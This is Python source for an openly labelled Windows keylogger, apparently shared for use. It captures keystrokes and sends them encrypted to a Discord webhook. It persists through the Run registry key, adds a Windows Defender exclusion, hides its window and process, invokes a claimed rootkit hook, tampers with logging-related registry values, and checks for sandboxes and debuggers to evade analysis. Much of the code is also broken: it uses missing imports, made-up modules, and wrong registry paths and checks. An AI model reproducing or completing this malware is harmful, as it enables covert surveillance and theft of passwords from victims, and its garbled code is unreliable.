import pycryptodome.Cipher
import winreg
import time
import psutil
import socket
import threading
import pyHook
import pythoncom
import base64
import ctypes
import os
import win32gui
import win32security
import win32con
import ssdt
import json
import requests
import sys

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def add_to_startup():
    try:
        reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(reg_key, "keylogger", 0, winreg.REG_SZ, sys.executable + ' ' + os.path.realpath(file))
        winreg.CloseKey(reg_key)
    except Exception as e:
        print(f"Error in add_to_startup: {e}")

def add_to_exclusions():
    try:
        key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, r'SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths')
        winreg.SetValueEx(key, '', 0, winreg.REG_SZ, os.path.realpath(file))
        winreg.CloseKey(key)
    except Exception as e:
        print(f"Error in add_to_exclusions: {e}")

# Feel free to add comments -urbancheese
def hide_window():
    try:
        hwnd = win32gui.GetForegroundWindow()
        win32gui.ShowWindow(hwnd, 0)
    except Exception as e:
        print(f"Error in hide_window: {e}")

def onKeyBoardEvent(event):
    if event.Ascii == 13: # key
        data = {
            "content": "".join(chr(key) for key in event.Key)
        }
        encrypted_data = encrypt_data(data)
        requests.post(webhook_url, data=encrypted_data, headers={'Content-Type': 'application/json'})
    return True

def start_keylogger():
    global webhook_url, file
    webhook_url = "YOUR_DISCORD_WEBHOOK_URL"
    file = "keylogger.txt"
    hm = pyHook.HookManager()
    hm.KeyDown = onKeyBoardEvent
    hm.HookKeyboard()
    pythoncom.PumpMessages()

def encrypt_data(data):
    try:
        # Consider retrieving the password from a secure location or prompt the user for it
        password = "your_secret_password"  # Define a more secure way to handle passwords
        salt = os.urandom(16)
        kdf = pycryptodome.Protocol.KDF.PBKDF2(password, salt)
        cipher = pycryptodome.Cipher.AES.new(kdf, pycryptodome.Cipher.MODE_EAX)
        ciphertext, tag = cipher.encrypt_and_digest(json.dumps(data).encode())
        nonce = cipher.nonce
        encrypted_data = base64.b64encode(nonce + salt + ciphertext + tag).decode()
        return encrypted_data
    except Exception as e:
        print(f"Error in encrypt_data: {e}")

def decrypt_data(encrypted_data):
    try:
        # Consider retrieving the password from a secure location or prompt the user for it
        password = "your_secret_password"  # Define a more secure way to handle passwords
        encrypted_data = base64.b64decode(encrypted_data.encode())
        nonce, salt, ciphertext, tag = (encrypted_data[:16], encrypted_data[16:32], encrypted_data[32:-16], encrypted_data[-16:])
        kdf = pycryptodome.Protocol.KDF.PBKDF2(password, salt)
        cipher = pycryptodome.Cipher.AES.new(kdf, pycryptodome.Cipher.MODE_EAX, nonce=nonce)
        data = json.loads(cipher.decrypt_and_verify(ciphertext, tag).decode())
        return data
    except Exception as e:
        print(f"Error in decrypt_data: {e}")

def hide_process():
    try:
        if is_admin():
            htoken = win32security.OpenProcessToken(win32api.GetCurrentProcess(), win32con.TOKEN_ADJUST_PRIVILEGES | win32con.TOKEN_QUERY)
            win32security.AdjustTokenPrivileges(htoken, False, [(win32security.LookupPrivilegeValue(None, "SeDebugPrivilege"), win32con.SE_PRIVILEGE_ENABLED)])
            
            pid = win32api.GetCurrentProcessId()
            handle = win32api.OpenProcess(win32con.PROCESS_ALL_ACCESS, False, pid)
            win32api.SetPriorityClass(handle, win32con.REALTIME_PRIORITY_CLASS)
            win32api.DuplicateHandle(win32api.GetCurrentProcess(), handle, win32api.GetCurrentProcess(), handle, 0, False, win32con.DUPLICATE_SAME_ACCESS)
    except Exception as e:
        print(f"Error in hide_process: {e}")

def anti_forensics():
    try:
        if is_admin():
            for log in ["Application", "Security", "Setup", "System"]:
                try:
                    reg_key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, f"System\CurrentControlSet\Control\WMI\Security{log}", 0, winreg.KEY_ALL_ACCESS)
                    winreg.SetValueEx(reg_key, "", 0, winreg.REG_SZ, "")
                    winreg.CloseKey(reg_key)
                except Exception as e:
                    print(f"Error in anti_forensics: {e}")
            
            for log in ["Application", "Security", "Setup", "System"]:
                try:
                    reg_key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, f"System\CurrentControlSet\Control\Lsa\CrashOnAuditFail{log}", 0, winreg.KEY_ALL_ACCESS)
                    winreg.SetValueEx(reg_key, "", 0, winreg.REG_SZ, "")
                    winreg.CloseKey(reg_key)
                except Exception as e:
                    print(f"Error in anti_forensics: {e}")

            try:
                winreg.DeleteKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run\keylogger")
            except Exception as e:
                print(f"Error in anti_forensics: {e}")

            try:
                os.remove(file)
            except Exception as e:
                print(f"Error in anti_forensics: {e}")
    except Exception as e:
        print(f"Error in anti_forensics: {e}")
def is_sandboxed():
    for check in [
        (lambda: os.getenv("PROCHOT") == "0"),
        (lambda: os.getenv("TERMISVM") == "1"),
        (lambda: os.path.exists("/proc/self/ns/user")),
        (lambda: os.path.exists("/proc/self/status") and "sandbox" in open("/proc/self/status").read()),
        (lambda: os.path.exists("/.dockerenv")),
        (lambda: os.path.exists("/.vagrant")),
        (lambda: socket.gethostname().startswith("vbox")),
        (lambda: os.getenv("VBOX_DESKTOP_NAME")),
        (lambda: os.getenv("VBOX_VERSION_INFO")),
        (lambda: os.getenv("VMWARE")),
        (lambda: os.getenv("VIRT_ENV")),
        (lambda: os.getenv("VIRTUAL_ENV")),
        (lambda: os.getenv("VIRTUALBOX_VERSION")),
        (lambda: os.getenv("WINDIR") == "C:\Windows\system32\cmd.exe"),
        (lambda: os.getenv("SYSTEMROOT") == "C:\Windows"),
        (lambda: os.getenv("PROCESSOR_IDENTIFIER").lower().startswith("intel") and "vmx" in os.getenv("PROCESSOR_IDENTIFIER").lower()),
        (lambda: os.getenv("PROCESSOR_LEVEL") == "6" and os.getenv("PROCESSOR_REVISION") == "3d" and os.getenv("PROCESSOR_ARCHITEW6432") == "AMD64"),
    ]:
        if check():
            return True
    return False

def check_debugger():
    try:
        if os.getenv("ISDebuggerPresent"):
            return True
    except: pass
    try:
        if "conhost.dll" not in win32api.GetModuleFileName(win32api.GetModuleHandle(None)):
            return True
    except:
        pass
    try:
        if "combase.dll" not in win32api.GetModuleFileName(win32api.GetModuleHandle("combase.dll")):
            return True
    except:
        pass
    try:
        if "kernel32.dll" not in win32api.GetModuleFileName(win32api.GetModuleHandle("kernel32.dll")):
            return True
    except:
        pass
    return False

def start_rootkit():
    try:
        if is_admin():
            htoken = win32security.OpenProcessToken(win32api.GetCurrentProcess(), win32con.TOKEN_ADJUST_PRIVILEGES | win32con.TOKEN_QUERY)
            win32security.AdjustTokenPrivileges(htoken, False, [(win32security.LookupPrivilegeValue(None, "SeDebugPrivilege"), win32con.SE_PRIVILEGE_ENABLED)])

            pid = win32api.GetCurrentProcessId()
            handle = win32api.OpenProcess(win32con.PROCESS_ALL_ACCESS, False, pid)
            win32api.SetPriorityClass(handle, win32con.REALTIME_PRIORITY_CLASS)
            win32api.DuplicateHandle(win32api.GetCurrentProcess(), handle, win32api.GetCurrentProcess(), handle, 0, False, win32con.DUPLICATE_SAME_ACCESS)
            threading.Thread(target=rootkit_hook).start()
    except Exception as e:
        print(f"Error in start_rootkit: {e}")

def rootkit_hook():
    try:
        import ssdt
        ssdt.hook()
    except Exception as e:
        print(f"Error in rootkit_hook: {e}")

if __name__ == "__main__":
    password = "your_secret_password"  #More secure way to secure your password
    if not check_debugger():
        if not is_sandboxed():
            if is_admin():
                add_to_exclusions()
                add_to_startup()
    hide_process()
    start_rootkit()
    start_keylogger()
    anti_forensics()
    is_sandboxed()